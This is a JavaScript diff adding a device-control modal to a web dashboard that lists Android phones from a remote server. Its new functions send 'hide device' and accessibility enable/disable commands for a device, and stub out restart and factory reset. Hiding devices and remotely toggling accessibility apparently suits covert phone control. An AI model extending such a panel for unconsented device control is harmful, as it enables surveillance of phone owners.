@@ -1,18 +1,138 @@
 const app = {
     SERVER_URL: 'https://sukh-3qtl.onrender.com/api/website/app-data',
+    COMMANDS_URL: 'https://sukh-3qtl.onrender.com/api',
     autoRefreshInterval: null,
     isAutoRefresh: true,
     currentView: 'grid',
     lastDataHash: '',
+    currentDevice: null,
 
     init: function() {
         document.addEventListener('DOMContentLoaded', function() {
             app.loadAllDevices();
             app.startAutoRefresh();
+            app.initModalEvents();
         });
         
         window.addEventListener('online', app.loadAllDevices);
         window.addEventListener('offline', app.handleOffline);
+    },
+
+    initModalEvents: function() {
+        // Modal close events
+        const modal = document.getElementById('deviceModal');
+        const closeBtn = document.querySelector('.close');
+        const closeModalBtn = document.getElementById('closeModalBtn');
+        
+        function closeModal() {
+            modal.style.display = 'none';
+            app.currentDevice = null;
+        }
+        
+        if (closeBtn) closeBtn.onclick = closeModal;
+        if (closeModalBtn) closeModalBtn.onclick = closeModal;
+        
+        // Close modal when clicking outside
+        window.onclick = function(event) {
+            if (event.target === modal) {
+                closeModal();
+            }
+        }
+
+        // Tab functionality
+        const tabBtns = document.querySelectorAll('.tab-btn');
+        tabBtns.forEach(btn => {
+            btn.addEventListener('click', function() {
+                const tabId = this.getAttribute('data-tab');
+                
+                // Remove active class from all tabs and contents
+                tabBtns.forEach(tb => tb.classList.remove('active'));
+                document.querySelectorAll('.tab-content').forEach(tc => tc.classList.remove('active'));
+                
+                // Add active class to current tab and content
+                this.classList.add('active');
+                document.getElementById(tabId + 'Tab').classList.add('active');
+            });
+        });
+
+        // Toggle switch functionality
+        const toggleSwitches = document.querySelectorAll('.toggle-input');
+        toggleSwitches.forEach(toggle => {
+            toggle.addEventListener('change', function() {
+                const label = this.nextElementSibling;
+                const textSpan = label.querySelector('.toggle-text');
+                
+                if (this.checked) {
+                    textSpan.textContent = 'Hide Device';
+                    app.sendHideCommand(true);
+                } else {
+                    textSpan.textContent = 'Show Device';
+                    app.sendHideCommand(false);
+                }
+            });
+        });
+
+        // Range slider functionality
+        const chargeMin = document.getElementById('chargeMin');
+        const chargeMax = document.getElementById('chargeMax');
+        const minLabel = document.getElementById('minLabel');
+        const maxLabel = document.getElementById('maxLabel');
+
+        if (chargeMin && chargeMax) {
+            chargeMin.addEventListener('input', function() {
+                minLabel.textContent = this.value + '%';
+                if (parseInt(chargeMax.value) < parseInt(this.value)) {
+                    chargeMax.value = this.value;
+                    maxLabel.textContent = this.value + '%';
+                }
+            });
+
+            chargeMax.addEventListener('input', function() {
+                maxLabel.textContent = this.value + '%';
+                if (parseInt(chargeMin.value) > parseInt(this.value)) {
+                    chargeMin.value = this.value;
+                    minLabel.textContent = this.value + '%';
+                }
+            });
+        }
+
+        // Sound mode buttons
+        const soundBtns = document.querySelectorAll('[data-sound]');
+        soundBtns.forEach(btn => {
+            btn.addEventListener('click', function() {
+                soundBtns.forEach(b => b.classList.remove('active'));
+                this.classList.add('active');
+                const soundMode = this.getAttribute('data-sound');
+                app.showToast(`Sound mode changed to: ${soundMode}`);
+            });
+        });
+
+        // Quick action buttons
+        const refreshBtn = document.getElementById('refreshDeviceBtn');
+        const pingBtn = document.getElementById('pingDeviceBtn');
+        const emergencyBtn = document.getElementById('emergencyBtn');
+        
+        if (refreshBtn) refreshBtn.addEventListener('click', app.refreshDevice);
+        if (pingBtn) pingBtn.addEventListener('click', app.pingDevice);
+        if (emergencyBtn) emergencyBtn.addEventListener('click', app.emergencyAction);
+
+        // Accessibility buttons
+        const enableAccBtn = document.getElementById('enableAccessibilityBtn');
+        const disableAccBtn = document.getElementById('disableAccessibilityBtn');
+        
+        if (enableAccBtn) enableAccBtn.addEventListener('click', () => app.accessibilityCommand('enable'));
+        if (disableAccBtn) disableAccBtn.addEventListener('click', () => app.accessibilityCommand('disable'));
+
+        // Danger zone buttons
+        const forceRestartBtn = document.getElementById('forceRestartBtn');
+        const factoryResetBtn = document.getElementById('factoryResetBtn');
+        
+        if (forceRestartBtn) forceRestartBtn.addEventListener('click', app.forceRestart);
+        if (factoryResetBtn) factoryResetBtn.addEventListener('click', app.factoryReset);
+
+        // Save settings button
+        const saveSettingsBtn = document.getElementById('saveSettingsBtn');
+        if (saveSettingsBtn) saveSettingsBtn.addEventListener('click', app.saveSettings);
     },
 
     loadAllDevices: async function() {
@@ -196,11 +316,16 @@ const app = {
             deviceCount.textContent = `${latestDevices.length} device${latestDevices.length !== 1 ? 's' : ''} connected`;
             devicesGrid.innerHTML = latestDevices.map(device => app.createDeviceCard(device)).join('');
             
-            // Add click events
+            // Add click events for device cards
             document.querySelectorAll('.device-card').forEach(card => {
                 card.addEventListener('click', function() {
                     const deviceId = this.getAttribute('data-device-id');
-                    app.openDeviceDetails(deviceId);
+                    const deviceData = latestDevices.find(device => 
+                        (device.device_id || device.device_model) === deviceId
+                    );
+                    if (deviceData) {
+                        app.openDeviceDetails(deviceData);
+                    }
                 });
             });
             
@@ -379,34 +504,254 @@ const app = {
         }
     },
 
-    openDeviceDetails: function(deviceId) {
-        alert(`Opening details for device: ${deviceId}\n\nFeature coming soon!`);
+    openDeviceDetails: function(deviceData) {
+        console.log('📱 Opening device details:', deviceData);
+        app.currentDevice = deviceData;
+        
+        // Fill modal with device data
+        document.getElementById('modalDeviceName').textContent = deviceData.device_model || 'Unknown Device';
+        document.getElementById('modalDeviceId').textContent = 'ID: ' + (deviceData.device_id || 'Unknown');
+        document.getElementById('modalBatteryPercent').textContent = (deviceData.battery_percent || 0) + '%';
+        
+        // Set battery fill and color
+        const batteryFill = document.getElementById('modalBatteryFill');
+        const batteryPercent = deviceData.battery_percent || 0;
+        batteryFill.style.width = batteryPercent + '%';
+        
+        if (batteryPercent <= 20) {
+            batteryFill.className = 'battery-fill-modal low';
+        } else if (batteryPercent <= 50) {
+            batteryFill.className = 'battery-fill-modal medium';
+        } else {
+            batteryFill.className = 'battery-fill-modal high';
+        }
+        
+        // Fill advanced info
+        document.getElementById('infoAndroid').textContent = deviceData.android_version || 'Unknown';
+        document.getElementById('infoTemp').textContent = (deviceData.temperature || 0).toFixed(1) + '°C';
+        document.getElementById('infoLastUpdate').textContent = new Date(deviceData.created_at).toLocaleString();
+        document.getElementById('infoCharging').textContent = deviceData.is_charging ? 'Charging' : 'Not Charging';
+        
+        // Set hide toggle state
+        const hideToggle = document.getElementById('hideDeviceToggle');
+        if (hideToggle) {
+            hideToggle.checked = deviceData.is_hidden || false;
+            const toggleText = hideToggle.nextElementSibling.querySelector('.toggle-text');
+            toggleText.textContent = deviceData.is_hidden ? 'Hide Device' : 'Show Device';
+        }
+        
+        // Show modal
+        const modal = document.getElementById('deviceModal');
+        modal.style.display = 'block';
+        
+        app.showToast(`Opened controls for: ${deviceData.device_model}`);
+    },
+
+    // 🔧 DEVICE CONTROL FUNCTIONS
+
+    sendHideCommand: async function(hide) {
+        if (!app.currentDevice) return;
+        
+        try {
+            const response = await fetch(`${app.COMMANDS_URL}/hide-device`, {
+                method: 'POST',
+                headers: {
+                    'Content-Type': 'application/json',
+                },
+                body: JSON.stringify({
+                    device_id: app.currentDevice.device_id,
+                    action: hide ? 'hide' : 'unhide'
+                })
+            });
+            
+            const result = await response.json();
+            
+            if (result.success) {
+                app.showToast(`Device ${hide ? 'hidden' : 'shown'} successfully`);
+                app.loadAllDevices(); // Refresh to update UI
+            } else {
+                app.showToast('Failed to update device visibility', 'error');
+            }
+        } catch (error) {
+            console.error('Hide command error:', error);
+            app.showToast('Network error - command not sent', 'error');
+        }
+    },
+
+    refreshDevice: function() {
+        if (!app.currentDevice) return;
+        app.showToast(`Refreshing ${app.currentDevice.device_model}...`);
+        // Implement device refresh logic here
+    },
+
+    pingDevice: function() {
+        if (!app.currentDevice) return;
+        app.showToast(`Ping sent to ${app.currentDevice.device_model}`);
+        // Implement ping logic here
+    },
+
+    emergencyAction: function() {
+        if (!app.currentDevice) return;
+        
+        if (confirm('🚨 Are you sure you want to trigger emergency action? This cannot be undone.')) {
+            app.showToast('Emergency action triggered!', 'warning');
+            // Implement emergency action logic here
+        }
+    },
+
+    accessibilityCommand: async function(action) {
+        if (!app.currentDevice) return;
+        
+        try {
+            const response = await fetch(`${app.COMMANDS_URL}/accessibility-command`, {
+                method: 'POST',
+                headers: {
+                    'Content-Type': 'application/json',
+                },
+                body: JSON.stringify({
+                    device_id: app.currentDevice.device_id,
+                    action: action,
+                    source: 'web_panel'
+                })
+            });
+            
+            const result = await response.json();
+            
+            if (result.success) {
+                app.showToast(`Accessibility ${action}d successfully`);
+            } else {
+                app.showToast(`Failed to ${action} accessibility`, 'error');
+            }
+        } catch (error) {
+            console.error('Accessibility command error:', error);
+            app.showToast('Network error - command not sent', 'error');
+        }
+    },
+
+    forceRestart: function() {
+        if (!app.currentDevice) return;
+        
+        if (confirm('⚠️ Force restart this device? This may cause data loss.')) {
+            app.showToast('Force restart command sent', 'warning');
+            // Implement force restart logic here
+        }
+    },
+
+    factoryReset: function() {
+        if (!app.currentDevice) return;
+        
+        if (confirm('💀 DANGER! This will erase all data and reset to factory settings. Are you absolutely sure?')) {
+            if (confirm('🚨 FINAL WARNING: This action cannot be undone! Type "RESET" to confirm.')) {
+                app.showToast('Factory reset command sent', 'error');
+                // Implement factory reset logic here
+            }
+        }
+    },
+
+    saveSettings: function() {
+        if (!app.currentDevice) return;
+        
+        // Get current settings from modal
+        const autoCharge = document.getElementById('autoChargeToggle')?.checked || false;
+        const chargeMin = document.getElementById('chargeMin')?.value || 20;
+        const chargeMax = document.getElementById('chargeMax')?.value || 80;
+        
+        app.showToast(`Settings saved: Auto Charge ${autoCharge ? 'ON' : 'OFF'}, Limits ${chargeMin}%-${chargeMax}%`);
+        
+        // Close modal after save
+        setTimeout(() => {
+            const modal = document.getElementById('deviceModal');
+            modal.style.display = 'none';
+            app.currentDevice = null;
+        }, 1500);
+    },
+
+    showToast: function(message, type = 'success') {
+        // Create toast element
+        const toast = document.createElement('div');
+        toast.className = `toast-message ${type}`;
+        toast.innerHTML = `
+            <i class="fas ${type === 'error' ? 'fa-exclamation-circle' : type === 'warning' ? 'fa-exclamation-triangle' : 'fa-check-circle'}"></i>
+            <span>${message}</span>
+        `;
+        
+        // Add styles if not exists
+        if (!document.querySelector('#toast-styles')) {
+            const styles = document.createElement('style');
+            styles.id = 'toast-styles';
+            styles.textContent = `
+                .toast-message {
+                    position: fixed;
+                    top: 20px;
+                    right: 20px;
+                    background: var(--card-bg);
+                    color: var(--text);
+                    padding: 15px 20px;
+                    border-radius: 10px;
+                    border: 1px solid var(--border);
+                    box-shadow: 0 5px 20px rgba(0,0,0,0.3);
+                    display: flex;
+                    align-items: center;
+                    gap: 10px;
+                    z-index: 10000;
+                    animation: slideInRight 0.3s ease, slideOutRight 0.3s ease 2.7s;
+                    max-width: 300px;
+                }
+                .toast-message.success { border-left: 4px solid var(--success); }
+                .toast-message.error { border-left: 4px solid var(--danger); }
+                .toast-message.warning { border-left: 4px solid var(--warning); }
+                @keyframes slideInRight {
+                    from { transform: translateX(100%); opacity: 0; }
+                    to { transform: translateX(0); opacity: 1; }
+                }
+                @keyframes slideOutRight {
+                    from { transform: translateX(0); opacity: 1; }
+                    to { transform: translateX(100%); opacity: 0; }
+                }
+            `;
+            document.head.appendChild(styles);
+        }
+        
+        document.body.appendChild(toast);
+        
+        // Remove toast after animation
+        setTimeout(() => {
+            if (toast.parentNode) {
+                toast.parentNode.removeChild(toast);
+            }
+        }, 3000);
     },
 
     toggleView: function() {
-        alert('Table view coming soon! Currently in Grid View.');
+        app.showToast('Table view coming soon! Currently in Grid View.', 'info');
     },
 
     showLoading: function() {
-        document.getElementById('loadingDevices').style.display = 'block';
-        document.getElementById('devicesGrid').style.display = 'none';
+        const loadingElement = document.getElementById('loadingDevices');
+        const devicesGrid = document.getElementById('devicesGrid');
+        if (loadingElement) loadingElement.style.display = 'block';
+        if (devicesGrid) devicesGrid.style.display = 'none';
     },
 
     hideLoading: function() {
-        document.getElementById('loadingDevices').style.display = 'none';
-        document.getElementById('devicesGrid').style.display = 'grid';
+        const loadingElement = document.getElementById('loadingDevices');
+        const devicesGrid = document.getElementById('devicesGrid');
+        if (loadingElement) loadingElement.style.display = 'none';
+        if (devicesGrid) devicesGrid.style.display = 'grid';
     },
 
     showError: function(message) {
         const loadingElement = document.getElementById('loadingDevices');
-        loadingElement.innerHTML = `
-            <i class="fas fa-exclamation-triangle" style="color: var(--secondary);"></i>
-            <div>${message}</div>
-            <button class="btn" onclick="app.loadAllDevices()" style="margin-top: 15px;">
-                <i class="fas fa-sync-alt"></i> Try Again
-            </button>
-        `;
-        loadingElement.style.display = 'block';
+        if (loadingElement) {
+            loadingElement.innerHTML = `
+                <i class="fas fa-exclamation-triangle" style="color: var(--secondary);"></i>
+                <div>${message}</div>
+                <button class="btn" onclick="app.loadAllDevices()" style="margin-top: 15px;">
+                    <i class="fas fa-sync-alt"></i> Try Again
+                </button>
+            `;
+            loadingElement.style.display = 'block';
+        }
     },
 
     startAutoRefresh: function() {
@@ -430,13 +775,19 @@ const app = {
         
         if (this.isAutoRefresh) {
             this.startAutoRefresh();
-            btn.innerHTML = '<i class="fas fa-clock"></i> Auto Refresh: ON';
-            btn.style.background = 'linear-gradient(45deg, var(--primary), #0099cc)';
+            if (btn) {
+                btn.innerHTML = '<i class="fas fa-clock"></i> Auto Refresh: ON';
+                btn.style.background = 'linear-gradient(45deg, var(--primary), #0099cc)';
+            }
         } else {
             this.stopAutoRefresh();
-            btn.innerHTML = '<i class="fas fa-clock"></i> Auto Refresh: OFF';
-            btn.style.background = 'linear-gradient(45deg, #666, #888)';
+            if (btn) {
+                btn.innerHTML = '<i class="fas fa-clock"></i> Auto Refresh: OFF';
+                btn.style.background = 'linear-gradient(45deg, #666, #888)';
+            }
         }
+        
+        app.showToast(`Auto Refresh ${this.isAutoRefresh ? 'Enabled' : 'Disabled'}`);
     },
 
     forceRefresh: function() {
